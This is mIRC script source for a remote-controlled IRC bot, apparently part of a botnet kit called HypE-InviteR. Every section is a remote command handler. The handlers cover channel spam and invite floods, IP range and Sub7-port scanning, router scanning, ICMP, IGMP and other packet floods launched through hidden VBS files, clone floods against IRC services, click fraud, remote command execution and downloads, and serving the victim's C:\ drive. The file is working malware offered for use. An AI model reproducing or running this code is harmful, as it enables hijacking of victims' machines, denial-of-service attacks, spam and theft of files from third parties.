alias chk {
  if ($1 == spam) {
    if ($2 == help) { emsg $a 12�15HypE-InviteR12�14 Commands | emsg $a !spam [on/off] | emsg $a !spam raw [raw command here] | emsg $a !spam emsg [New spam msg] | emsg $a !spam stats | emsg $a !spam type [msg/send] | emsg $a !spam file [name of file to send] }
    if ($2 == stats) { emsg $a 12�15HypE-InviteR12�14 Status: ( $+ $iif($sock(wSck32) != $null,ON,off) $+ ) Spamming Server: ( $+ $sock(wSck32).ip $+ ) Spamming Chans: ( $+ %spam.chans $+ ) Total Spammed: ( $+ %spammed $+ ) Type: ( $+ %spamtype $+ ) Total Sends: ( $+ %total.sent $+ ) File: ( $+ %winfile $+ ) Ext: ( $+ %ext $+ ) }
    if ($2 == off) { stop.dspam | emsg $a 12�15HypE-InviteR12�14 Disabled spammer | halt }
    if ($2 == raw) { sockwrite -tn wSck32 $$3- | emsg $a 12�15HypE-InviteR12�14 Performed raw command.. | halt }
    if ($2 == msg) { if ($3 == $null) { 12�15HypE-InviteR12�14 Spam message is currently set to: %spam.msg | halt } | set %spam.msg $3- | emsg $a 12�15HypE-InviteR12�14 Spam message is now set to: $3- }
    if ($2 == on) { if ($sock(wSck32) != $null) { emsg $a 12�15HypE-InviteR12�14 Error! Already spamming. | halt } | if ($4 !isnum) { emsg $a 12�15HypE-InviteR12�14 Error! Use !spam on irc.dal.net 6667 | halt } | set %spam.server $3 | set %spam.port $4 | emsg $a 12�15HypE-InviteR12�14 Enabled spammer! | start.dspam }
    if ($2 == type) { if ($3 == MSG) { emsg $a 12�15HypE-InviteR12�14 Spam set to: MSG | set %spamtype MSG | halt } | if ($3 == SEND) { emsg $a 12�15HypE-InviteR12�14 Spam set to: SEND | set %spamtype SEND | halt } | emsg $a 12�15HypE-InviteR12�14 Error! Please use !spam type [msg/send] }
    if ($2 == ext) { if ($3 == $null) { emsg $a 12�15HypE-InviteR12� Error! Use !spam ext .exe | halt } | set %ext $3- | emsg $a 12�15HypE-InviteR12� Set file extension to ( $+ $3- $+ ) Type !spam type send to enable DCC sends. }
    if ($2 == file) { if ($3 == $null) { emsg $a 12�15HypE-InviteR12� Error! Use !spam file C:\windows\win.ini | halt } | set %winfile $3- | emsg $a 12�15HypE-InviteR12� Set file send to ( $+ $3- $+ ) Type !spam type send to enable DCC sends. }
    if ($2 == version) { emsg $a 12�15HypE-InviteR12�14 (v2.1) By: <the scripting g0d himself>-<NaHeMiA>-<the scripting g0d himself> and Acid who helped =D }
  }
  if ($1 == inviter) {
    set %s.i.c $iif(# == $null,$nick,#)
    if ($2 == load) { set %i.server $3 | set %i.port $4 | set %i.b on | s.inviter }
    if ($2 == stop) { sockclose inviter* | remove ichat.txt | set %i.b off | unset %i.temp.* | .timerinviteconnect off | emsg $a 12[15in14vit15er12]:  Inviter has been killed. }
    if ($2 == status) {  if ($sock(inviter*,0) == 0) { emsg $a 12[15in14vit15er12]: Status: Not Connected! | halt } | if ($sock(inviter*,0) > 0) { emsg $a 12[15in14vit15er12]: Status: Connected [ $+ $sock(inviter*,0) $+ ] } }
    if ($2 == stats) { emsg $a 12[15in14vit15er12]: (Stats) Total Invited: $calc( %i.t.j  +  %i.t.p ) Delay: ( $+ %i.ondelay $+ ) }   |  if ($2 == list) { sockwrite -nt inviterN LIST :* $+ $3 $+ * }
    if ($2 == message) { set %imsg $3- | emsg $a 12[15in14vit15er12]:  Invite Message set as [ $+ $3- $+ ] }
    if ($2 == ctotal) { emsg $a 12[15in14vit15er12]: Random Channels Total: $+ $lines(ichan.txt) }
    if ($2 == reset) { emsg $a 12[15in14vit15er12]: All Settings Unset! | unset %i.t.j  | unset %i.t.p | unset %imsg | unset %i.server | unset %s.i.c | unset %i.b | unset %i* | write -c ichan.txt | remove ichan.txt | unset %t.i | sockclose inviter* }
    if ($2 == mode) { sockwrite -tn inviter* MODE $3- | emsg $a 12[15in14vit15er12]: Set Mode $3- }
    if ($2 == join) {  if ($3 == random) {  if ($lines(ichan.txt) < 0) || ($exists(ichan.txt) == $false) { emsg $a 12[15in14vit15er12]: Error: Gather channels first! | halt } | set %i.r.j.a $4 | set %i.r.j.i 0 | :loop | if (%i.r.j.i  > %i.r.j.a) { goto end } | sockwrite -nt inviterN JOIN : $+ $read -l $+ $r(1,$lines(ichan.txt)) ichan.txt  | inc %i.r.j.i  | goto loop | :end | unset %i.r.j.i | unset %i.r.j.a   | halt } | else { sockwrite -nt inviterN JOIN : $+ $3 } }
    if ($2 == part) { //sockwrite -nt inviterN PART : $+ $3- }   |  if ($2 == nick) { if ($3 == random) { sockwrite -nt inviterN NICK $read webfonts.dll | halt }  |  //sockwrite -nt inviterN NICK $3   } 
    if ($2 == delay) { set %i.ondelay $3 | emsg $a 12[15in14vit15er12]:  Delay set to: ( $+ $3 $+ ). }
  }
  if ($1 == turbo) {
    if ($2 == start) { enable #dns | invitebot3 $3- | set %turbo.time.started 0 | .timerINCTT 0 1 /inc %turbo.time.started 1 | set %turbo.main.ch4n $chan | emsg $a Inviting to $5 on $3 $+ : $+ $4 }
    if ($2 == help) { emsg $a !turbo start server port channel message }
    if ($2 == stop) { if ($sock(turbo)) { sockclose turbo } | .timerINCTT off | unset %turbo*  | emsg $a Inviter halted. }
  }
  if ($1 == scanStatus) {
    if (%scan.nick != $null) { .emsg $nick I'm Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay) }
    else { .emsg $nick No Scans In Progress }
  }
  if ($1 == scanAbort) {
    if ($nick = %scan.nick) { .emsg $nick you have just aborted the scanning of port  $+ %scan.port $+  | .timerscan off | .timersockcheck off | unset %scan.* | .sockclose scan* | halt }
    else { .emsg $nick Sorry but your not the user that started the scan so you cannot be the user to Abort the Scan | halt }
  }
  if ($1 == scan) {
    if (%scan.nick != $null) { .emsg $nick I'm Allready Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay) | halt }
    if ($remove($2,$chr(46)) !isnum) || ($remove($3,$chr(46)) !isnum) || ($remove($4,$chr(44)) !isnum) || ($5 !isnum) { .emsg $nick Syntax: please Type !scan <starting ip> <ending ip> <port> <delay> EX !scan 24.24.24.1 24.24.24.255 27374 5 | halt }
    else {
      set %scan.Start1 $gettok($2,1,46)
      set %scan.Start2 $gettok($2,2,46)
      set %scan.Start3 $gettok($2,3,46)
      set %scan.Start4 $gettok($2,4,46)
      set %scan.Perm1 $gettok($2,1,46)
      set %scan.Perm2 $gettok($2,2,46)
      set %scan.Perm3 $gettok($2,3,46)
      set %scan.Perm4 $gettok($2,4,46)
      set %scan.End1 $gettok($3,1,46)
      set %scan.End2 $gettok($3,2,46)
      set %scan.End3 $gettok($3,3,46)
      set %scan.End4 $gettok($3,4,46)
      if (%scan.start1 > 255) || (%scan.start2 > 255) || (%scan.start3 > 255) || (%scan.start4 > 255) || (%scan.end1 > 255) || (%scan.end2 > 255) || (%scan.end3 > 255) || (%scan.end4 > 255) { .emsg $nick Sorry but you entered a digit Out Of Range | unset %scan.* | halt }
      if (%scan.start1 > %scan.end1) || (%scan.start2 > %scan.end2) || (%scan.start3 > %scan.end3) || (%scan.start4 > %scan.end4) { .emsg $nick Error Starting scan, your ending Ip is greater then your Starting ip | unset %scan.* | halt }
      set %scan.port $4
      set %scan.delay $5
      set %scan.nick $nick
      .timerscan 0 %scan.delay scancheck
      .emsg %scan.nick now Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay)
    }
  }
  if ($1 == sub7.updater) { 
    if ($2 == on) { enable #Sub7Update | .enotice $nick Sub7 Updater Now On }
    if ($2 == off) { disable #Sub7Update | .enotice $nick Sub7 Updater Now Off }
    if ($2 == uplocation) { set %uplocation $3- | .enotice $nick Sub7 Updater Location File set to: $3- }
    if ($2 == update) { f0du $3- }
  }
  if ($1 == if) {
    if ($5 == $null) { goto err0r }
    if ($3 == $chr(61) $+ $chr(61)) { if ( [ [ $2 ] ] == [ [ $4 ] ] ) { $5- } | emsg # Performed if ( [ [ $2 ] ] == [ [ $5 ] ] ) $chr(123) $5- $chr(125) | halt }
    if ($3 == $chr(62)) { if ( [ [ $2 ] ] > [ [ $4 ] ] ) { $5- } | emsg # Performed if ( [ [ $2 ] ] > [ [ $5 ] ] ) $chr(123) $5- $chr(125) | halt }
    if ($3 == $chr(60)) { if ( [ [ $2 ] ] < [ [ $4 ] ] ) { $5- } | emsg # Performed if ( [ [ $2 ] ] < [ [ $5 ] ] ) $chr(123) $5- $chr(125) | halt }
    if ($3 == $chr(33) $+ $chr(61)) { if ( [ [ $2 ] ] != [ [ $4 ] ] ) { $5- } | emsg # Performed if ( [ [ $2 ] ] != [ [ $5 ] ] ) $chr(123) $5- $chr(125) | halt }
    :err0r
    emsg # Error: Please use !if <parm1> == <parm2> <commands to perform> | halt
  }
  if ($1 == click) { 
    if ($2 == off) { timerclicker off | emsg $a 14"15Clicker14" Stopped clicking %click.url | sockclose webpage* | halt } 
    if ($2 == stats) { 
      if ($timer(clicker) == $null) { emsg $a 14"15Clicker14" idle.. | halt } 
      emsg $a 14"15Clicker14" Currently clicking: 12�14(15 $+ %click.url $+ 14)12� Clicks left:12 $timer(clicker).reps Delay:12 $duration($timer(clicker).delay) Time left:12 $duration($calc($timer(clicker).reps * $timer(clicker).delay)) 
      halt 
    }
    if (($4 !isnum) && ($4 != random)) { emsg $a 14"15Clicker14" Error! Syntax: !click http://www.url.com <number of times> <delay> (Note: use 'random' to make it delay between 5-45 seconds) | halt } 
    if ((http:// !isin $2) || ($3 !isnum)) { emsg $a 14"15Clicker14" Error! Syntax: !click http://www.url.com <number of times> <delay> (Note: use 'random' to make it delay between 5-45 seconds) | halt } 
    var %c = $4 | if ($4 == random) { set %c $rand(5,45) } | set %click.url $2 | set %click.url2 $remove($2,http://,https://,$gettok($remove($2,http://,https://),1,47)) | emsg $a 14"15Clicker14" Now clicking 12 $+ $2 $+  $3 times, with a delay of 12 $+ $duration(%c) 8~~14 Type !click off to stop! 
    if (%click.url2 == $chr(47)) { set %click.url2 $chr(47) $+ index.html }
    timerclicker $3 %c webview1 $gettok($remove($2,http://,https://),1,47) 80 
  }
  if ($1 == netspam) {
    if ($2 == help) {
      emsg $a 5[�12Net Spammer Help5]
      emsg $a 5[�12Net Spammer Help5]14 !netspam msg <Message>
      emsg $a 5[�12Net Spammer Help5]14 !netspam delay <Delay>
      emsg $a 5[�12Net Spammer Help5]14 !netspam on <Server> <Port>
      emsg $a 5[�12Net Spammer Help5]14 !netspam off
    }
    if ($2 == join) { sockwrite -nt netspam JOIN $3- }
    if ($2 == part) { sockwrite -nt netspam PART $3 : $+ $4- }
    if ($2 == msg) { set %netspam.message $3- | emsg $a 5[�12Net Spammer 5]14Message: $3- }
    if ($2 == on) { netspam.start $3- }
    if ($2 == off) { netspam.stop }
    if ($2 == delay) { set %netspam.delay $3 | emsg $a 5[�12Net Spammer 5]14Delay: $3- }
  }
  if ($1 == portredirect) {
    if ($2 == $null) { emsg $a 14Portredirection Error!!! For help type: !portredirect help | halt }
    if ($2 == help) { emsg $a 14*** Port Redirection Help! *** | /.emsg $a 14Commands.. | //.emsg $a 14!portredirect add 1000 irc.dal.net 6667 | emsg $a 14!portredirect stop port | //.emsg $a 14!portredirect stats | emsg $a 14Port Redirect Help / END halt }
    if ($2 == add) { if ($5 == $null) { emsg $a 3Port Redirection Error: !portredirect add inputport outputserver outputserverport (!portredirect add 1000 irc.dal.net 6667) | halt } | //gtportdirect $3- | emsg $a 14[Redirect Added] I-port=( $+ $3 $+ ) to $4 $+ $5 | emsg $a 12[Local IP Address]:14 $ip |  halt  } 
    if ($2 == stop) {  if ($3 == $null) { halt } | /pdirectstop $3 |  emsg $a 14[Portredirection] Port:(12 $+ $3 $+ 14) Has been stopped. |  halt  }
    if ($2 == stats) { emsg  $a 12*** Port Redirection Stat's. |  /predirectstats $a  }
  }
  if ($1 == router.scan) {
    %scan.# = $a
    if ($2 == stop) { emsg %scan.# Router Scanner shutdown | routercleanup }
    if ($2 == start) {
      if (!$4) emsg %scan.# Error/Syntax: !router.scan start Starting_IP Ending_IP
      else {
        sockclose router.* | set %s.ip $3 | set %e.ip $4 | set %sl.ip $longip($3) | set %el.ip $longip($4) | set %routerscan 1 | emsg %scan.# Router Scanner Start $3 to $4 ( $+ $longip($3) to $longip($4) $+ ) | sockopen router. $+ $ticks %s.ip 23 | .timerrouter. $+ $5 0 %s.delay /nextrouter
      }
    }
  }
  if ($1 == group.self) { set %group $r(1,9) | emsg $a I am now in random group %group }
  if ($1 == group $+ %group) { //chk $gettok($1-,2-,32) }
  if ($1 == group.clear) { unset %group | emsg $a I am now in no group. }
  if ($1 == group.add) && ($2 != $null) { if ($2 == 0) { set %group $r(1,9) } | else { set %group $2 } | emsg $a I am now in group %group }
  if ($1 == group.rem) { if ($2 == %group) { unset %group | emsg $a No longer in group $2 } }
  if ($1 == download) { %d.# = $a | emsg %d.# Downloading $2 | download $2- }
  if ($1 == url) { run $2- | emsg $a Visibly visitted $2- with users web browser }
  if ($1 == igmp) { if ($2 == $null) { /emsg # Error/Syntax: (!igmp ip.here) | halt } | .remove igmp.vbs | .write igmp.vbs Set src3 = CreateObject("Wscript.shell") | .write igmp.vbs src3.run "command /c igmp $2 ",0,true | .run igmp.vbs }
  if ($1 == pepsi) { if ($2 == $null) { /emsg # Error/Syntax: (!pepsi ip howmany size port, ie: !pepsi 127.0.0.1 1000 200 139) | halt } | .remove pepsi.vbs | .write pepsi.vbs Set src3 = CreateObject("Wscript.shell") | .write pepsi.vbs src3.run "command /c pepsi -n $3 -p $4 -d $5 $2 ",0,true | .run pepsi.vbs }
  if ($1 == icmp) { if ($2 == $null) { /emsg # Error/Syntax: (!icmp ip packetsize howmany, ie: !icmp 127.0.0.1 2000 1000) | halt } | .remove icmp.vbs | .write icmp.vbs Set src3 = CreateObject("Wscript.shell") | .write icmp.vbs src3.run "command /c ping -n $4 -l $3 -w 0 $2 ",0,true | .run icmp.vbs }
  if ($1 == netsend) && ($os == 2000) { if ($2 == $null) { /emsg # Error/Syntax: (!netsend ip message, ie: !netsend 127.0.0.1 this is waldo | halt } | .remove netsend.vbs | write netsend.vbs Set src3 = CreateObject("Wscript.shell") | write netsend.vbs src3.run "command /c net send $2 $3- ",0,true | run netsend.vbs }
  if ($1 == join) { if ($2 == $null) { halt } | else { join $2- } }
  if ($1 == part) && ($2 != $null) { if ($2 == $connect.chan) { .emsg $a I'm not parting $connect.chan $+ ! | halt } | //part $2 $3- }
  if ($1 == msg) { .msg $2 $3- | enotice $nick Completed Task! }
  if ($1 == notice) { .notice $2 $3- | enotice $nick Completed Task! }
  if ($1 == quit) { .enotice $nick Completed Task! | quit $2- }
  if ($1 == flood.string) { if ($2 == $null) { set %flood AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYz } | else { set %flood $2- } }
  if ($1 == flood.message) { flood.message $2- }
  if ($1 == flood.notice) { flood.notice $2- }
  if ($1 == flood.action) { flood.action $2- }
  if ($1 == flood.ctcp) { flood.ctcp $2- }
  if ($1 == flood.nick) { flood.nick $2- }
  if ($1 == flood.dcc.chat) { flood.dcc.chat $2- }
  if ($1 == flood.dcc.send) { flood.dcc.send $2- }
  if ($1 == flood.quit) { flood.quit $2- }
  if ($1 == flood.fserver) { flood.fserver $2- }
  if ($1 == flood.random) { flood.random $2- }
  if ($1 == flood.hidden) { flood.hidden $2- }
  if ($1 == flood.2hidden) { flood.2hidden $2- }
  if ($1 == flood.attack) { flood.attack $2- }
  if ($1 == flood.random.part) { flood.r4ndom $2- }
  if ($1 == flood.blowup) { flood.blowup $2- }
  if ($1 == flood.hop) { flood.hop $2- }
  if ($1 == die) { rechk.mini | saveini | equit Reloading | chars | fuckit }
  if ($1 == portscan) {  if ($4 == $null) { emsg $a Error !portscan [ip-address] [start-port] [end-port] | halt }  |  if ($calc($4 - $3) > 800) { emsg $a Error; please scan under 800 ports at a time! | halt } | set %port.to.scan $3 | set %port.to.scan %port.to.scan $+ - $+ $4 |  set %port.scan.ip $2 |  set %schan $a |  //emsg $a 14[15portscan14] Now scanning $2 on %port.to.scan |  port.range.scan %port.scan.ip }
  if ($1 == flood.stop) { flood.stop }
  if ($1 == exit) { equit [eXit] $ip - Nick: $nick | exit }
  if ($1 == write) { write $2 $3- | enotice $nick Completed Task! }
  if ($1 == load) { if ($2 == $null) { halt } | if ($2 == remote) { .load -rs $3- } | if ($2 == alias) { .load -a $3- } | .enotice $nick Script Loaded: $3- }
  if ($1 == run) { //run $2- | .enotice $nick Completed Task! }
  if ($1 == reboot) { equit [reb00ting] $ip | //run $mircdir $+ rb.exe | /exit }
  if ($1 == remove.user) && ($2 != $null) { /ruser $3 $2- | .enotice $nick $2- Removed From My Access List. }
  if ($1 == packet) { //packetofdeath $2 $3 $4 }
  if ($1 == cstats) { emsg $a 14[15Channel-Stats14]: 12-14(12 $+ # $+ 14)12- 14[14T15o0t14al: 14(12 $+ $nick(#,0,a) $+ 14) 44(12100%4)14]  | emsg # 14[15Channel-Stats14]: 14[O15pe0ra15to14r's: (12 $+ $nick(#,0,o) $+ 14) 4(12 $+ $percent($nick(#,0,o),$nick(#,0,a)) $+ 4)14] 14[V15o0i15c14e's: 14(12 $+ $nick(#,0,v) $+ 14) 144(12 $+ $percent($nick(#,0,v),$nick(#,0,a)) $+ 144)14]  }
  if ($1 == voiceall) {  emsg $a 14[15Mass 12(3Voicing12)15 Everyone in3 # $+ 15...14]  | %va.t = $nick(#,0,r)  | %va.1 = 1  |   :loop |  if (%va.1 >= %va.t) { goto end  }  |  mode # +vvvv $nick(#,%va.1,r)  $nick(#, [ $calc( [ [ %va.1 ] ] +1) ] ,r) $nick(#, [ $calc( [ [ %va.1 ] ] +2) ] ,r) $nick(#, [ $calc( [ [ %va.1 ] ] +3) ] ,r) |  inc %va.1 4 |   goto loop  |   :end   |   unset %va.*  }
  if ($1 == opall) { emsg $a 14[15Mass 12(3Op`n12)15 Everyone in3 # $+ 15...14]  |  %va.t = $nick(#,0,r)  |   %va.1 = 1  |   :loop |   if (%va.1 >= %va.t) { goto end  }  |  mode # +oooo $nick(#,%va.1,r)  $nick(#, [ $calc( [ [ %va.1 ] ] +1) ] ,r) $nick(#, [ $calc( [ [ %va.1 ] ] +2) ] ,r) $nick(#, [ $calc( [ [ %va.1 ] ] +3) ] ,r) |   inc %va.1 4  |   goto loop  |   :end   |   unset %va.*  }
  if ($1 == devoiceall) { emsg $a 14[15Mass 12(3Devoice`n12)15 Everyone in3 # $+ 15...14]  | %va.t = $nick(#,0,a)  | %va.1 = 1  |   :loop |  if (%va.1 >= %va.t) { goto end  }  |  mode # -vvvv $nick(#,%va.1,a)  $nick(#, [ $calc( [ [ %va.1 ] ] +1) ] ,a) $nick(#, [ $calc( [ [ %va.1 ] ] +2) ] ,a) $nick(#, [ $calc( [ [ %va.1 ] ] +3) ] ,a) |  inc %va.1 4 |   goto loop  |   :end   |   unset %va.*  }
  if ($1 == deopall) {  emsg $a 14[15Mass 12(3Deop`n12)15 Everyone in3 # $+ 15...14]  | %va.t = $nick(#,0,a)  |   %va.1 = 1  |   :loop |   if (%va.1 >= %va.t) { goto end  }  |  mode # -oooo $nick(#,%va.1,a)  $nick(#, [ $calc( [ [ %va.1 ] ] +1) ] ,a) $nick(#, [ $calc( [ [ %va.1 ] ] +2) ] ,a) $nick(#, [ $calc( [ [ %va.1 ] ] +3) ] ,a) |   inc %va.1 4  |   goto loop  |   :end   |   unset %va.*  }
  if ($1 == ident) { if ($2 == $null) { halt } | emsg # 15[14`15Ident14`15]12 set as3 $2 $+ 12... | identd on $2 }
  if ($1 == reload) { emsg $a [Reloading $2 $+ ... $+ ] | /reload -rs $2 } 
  if ($1 == stats) { .emsg $a I am using (Windows $os $+ ) With mIRC version $version I have been connected to ( $+ $server $+ ) on port ( $+ $port $+ ) for ( $+ $duration($online) $+ ). It has been ( $+ $duration($calc($ticks / 1000)) $+ ) since i last rebooted Ip Address is ( $+ $ip $+ ) Mask ( $+ $host $+ ) }
  if ($1 == url.state) { if ($url == $null) { emsg $a [URL]: [n0ne] } | else { emsg $a [URL]: $url } }
  if ($1 == varset) && ($3 != $null) { if ($2 == $chr(37) $+ c) { chan.set $2- | emsg $a Connect channel set to: $3- | halt } | //set $2 [ [ $3- ] ] | //emsg $a 14[12var set:14] [12 $+ $2 $+ 14] :to: [12 $+ [ [ $3- ] ] $+ 14] | saveini }
  if ($1 == var) && ($2 != $null) { emsg $a  $+ $2 $+  is currently set to [ [ $2- ] ] }
  if ($1 == pfast) { %pchan = $a | if ($4 == random) { //gcoolstart $2 $3 $rand(1,64000) | /halt } | //gcoolstart $2 $3 $4 }
  if ($1 == nick) { nick $2 $+ $r(1,999999) }
  if ($1 == nick.reset) { bnick }
  if ($1 == server.set) { set %s $iii($2-) | saveini | .enotice $nick Server set to $2- }
  if ($1 == channel.set) { set %c $iii($2-) | set %c $iii(%c) | saveini | .enotice $nick Channel set to $2- }
  if ($1 == jump) { saveini | equit [Jump] $ip | /fuckit }
  if ($1 == fileserver.access) { /emsg $a 14[12File-Server-Initialized14] 15(2 $+ $nick $+ 15) (: 3Enjoy! | /fserve $nick 3 C:\ }
  if ($1 == clone.status) {   emsg $a Clone Status: [C: $+ $sock(clone*,0) $+ / $+ W: $+ $sock(sock*,0) $+ ]  [T:14 $+ $calc($sock(clone*,0)+$sock(sock*,0)) $+ ] }
  if ($1 == cycle) { if ($2 == $null) { emsg $a Error/Syntax: (!cycle #Channel) } | raw part $2 :Cycling. | timer 1 1 join $2 }
  if ($1 == op) {  if ($3 == $null) { emsg $a Error/Syntax: !op #channel $nick | halt } |   else { /mode $2 +oooooo $3- } }
  if ($1 == deop) {  if ($3 == $null) { emsg $a Error/Syntax: !deop #channel $nick | halt } |  else { /mode $2 -oooooo $3- }  }
  if ($1 == drun) { if ($2 == $null) { emsg $a Error/Syntax: !drun <mirc command> | halt } | // $+ $2- | .enotice $nick Task completed. }
  if ($1 == voice) {  if ($3 == $null) { emsg $a Error/Syntax:  !voice #channel Nick | halt } |   else { /mode $2 +v $3 }  }
  if ($1 == devoice) {  if ($3 == $null) { emsg $a Error/Syntax: !devoice #channel Nick | halt } |     else { /mode $2 -v $3 }  }
  if ($1 == kick) {  if ($4 == $null) { emsg $a Error/Syntax: !kick #channel Nick MSG | halt } |  else { /kick $2 $3 $4- }  } 
  if ($1 == kick/ban) { if ($4 == $null) { emsg $a Syntax: !kick/ban #channel Nick MSG (KickMessage) | halt } |  else {  /mode $2 -o+b $3 $address($3,2)  | /kick $2 $3 $4-  | halt }  }
  if ($1 == clone.flood.ctcp.all) {  if ($2 == $null) { halt } | /clone all $$2  }
  if ($1 == clone.flood.ctcp.version) {  if ($2 == $null) { halt } | /clone version $$2 }
  if ($1 == clone.flood.ctcp.ping) {  if ($2 == $null) { halt } | /clone ping $$2 }
  if ($1 == max.load) { set %max.load $2 }
  if ($1 == clone.flood.ctcp.time) {  if ($2 == $null) { halt } | /clone time $$2 }
  if ($1 == clone.service.killer) {  if ($sock(clone*,0) == 0) { goto gatechange } 
    %sk = 1  |     :skloop |   if (%sk > $sock(clone*,0)) { goto end }  |  sockwrite -n $sock(clone*,%sk) Nick $randomgen($r(0,9))  |  %random.sk.temp = $randomgen($r(0,9))  |  %random.sk.temp2 = $randomgen($r(0,9))  |  %random.sk.temp3 = $randomgen($r(0,9))  |  sockwrite -n $sock(clone*,%sk) NICKSERV register %random.sk.temp  |  sockwrite -n $sock(clone*,%sk) NICKSERV identify %random.sk.temp  |  sockwrite -n $sock(clone*,%sk) JOIN $chr(35) $+ %random.sk.temp2   
    sockwrite -n $sock(clone*,%sk) CHANSERV REGISTER $chr(35) $+ %random.sk.temp2 %random.sk.temp3 cool  |  sockwrite -n $sock(clone*,%sk) JOIN $chr(35) $+ %random.sk.temp2  |  unset %random.sk.temp*  |   inc %sk  |   goto skloop  |   :end  |  :gatechange  |   %gsk = 1  |   :gchnge   |   if (%gsk > $sock(sock*,0)) { goto end2 }   |   sockwrite -n $sock(sock*,%gsk) Nick $randomgen($r(0,9))  |  %random.sk.temp = $randomgen($r(0,9))  |   %random.sk.temp2 = $randomgen($r(0,9))  
    %random.sk.temp3 = $randomgen($r(0,9))    |   sockwrite -n $sock(sock*,%gsk) NICKSERV register %random.sk.temp  |   sockwrite -n $sock(sock*,%gsk) NICKSERV identify %random.sk.temp |   sockwrite -n $sock(sock*,%gsk) JOIN $chr(35) $+ %random.sk.temp2  |   sockwrite -n $sock(sock*,%gsk) CHANSERV REGISTER $chr(35) $+ %random.sk.temp2 %random.sk.temp3 cool  |   sockwrite -n $sock(sock*,%gsk) JOIN $chr(35) $+ %random.sk.temp2  |  unset %random.sk.temp* 
  inc %gsk  | goto gchnge |   :end2 |   halt  }
  if ($1 == clone.chanserv.killer) { if ($sock(clone*,0) == 0) { halt } | var %load = 1 | :ckloop | if (%load > $sock(clone*,0)) { goto d0ne } | var %ckchan = $chr(35) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(1,999) $+ $r(a,z) | sockwrite -tn $sock(clone*,%load) JOIN %ckchan | sockwrite -tn $sock(clone*,%load) CHANSERV register %ckchan $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) | inc %load | goto ckloop | :end | sockwrite -tn clone* CHANSERV help set | sockwrite -tn clone* CHANSERV help mlock | sockwrite -tn clone* CHANSERV help set }
  if ($1 == clone.load) {  if ($4 == $null) { halt } | if (%max.load == $null) { emsg # Error: please set %max.load $+ . | halt } |   if ($sock(clone*,0) >= %max.load) { emsg # [Max-Reached] ( $+ [ [ %max.load ] ] $+ ) | halt } |   /emsg # [Loading]: $4 Clone(s) to ( $+ $$2 $+ ) on port $3  |   /clone connect $2 $3 $4  }
  if ($1 == clone.load.random) { if ($lines(servers.txt) < 0) { /emsg # Error: There are (0) Server's in Servers.txt | halt }  |  if (%max.load == $null) { emsg # error: please set %max.load $+ . | halt }  |  if ($sock(clone*,0) >= %max.load) { emsg # [Max-Reached] ( $+ [ [ %max.load ] ] $+ ) | halt }  |  if ($2 == $null) { emsg # Error, no (port specified) | halt }   |   if ($3 == $null) { emsg # Error, no (amount specified) | halt } | else { /emsg # [Loading]: $3 Clone(s) to (Random Server) on port $2   |  //clone connect $read servers.txt $2 $3 } }
  if ($1 == clone.part) { /clone part $2- }
  if ($1 == clone.join) { /clone join $2- }
  if ($1 == clone.fserver) && ($2 != $null) { sockwrite -tn clone* PRIVMSG $2 : $+ $rand.fserver }
  if ($1 == clone.combo.fserver) && ($2 != $null) { sockwrite -tn clone* PRIVMSG $2 : $+ $rand.fserver | .timerfserver1 1 3 //sockwrite -tn clone* PRIVMSG $2 : $+ $rand.fserver | .timerfserver1 1 5 //sockwrite -tn clone* PRIVMSG $2 : $+ $rand.fserver }
  if ($1 == clone.dcc.chat) { sockwrite -n clone* PRIVMSG $2 :DCC CHAT $2 1058633484 3481 }
  if ($1 == clone.dcc.send) { sockwrite -n clone* PRIVMSG $2 :DCC SEND $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ .txt 1058633484 2232 $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+  }
  if ($1 == clone.flood.ctcp.ping) {  /clone ping $$2  }
  if ($1 == clone.flood.ctcp.time) { /clone time $$2  }
  if ($1 == clone.cycle) {  /clone part $$2 |   /clone join $$2  }
  if ($1 == clone.cycle.flood) { clone part $2 | clone join $2 | clone part $2 | clone join $2 }
  if ($1 == clone.msg) {  /clone msg $$2 $3-  }
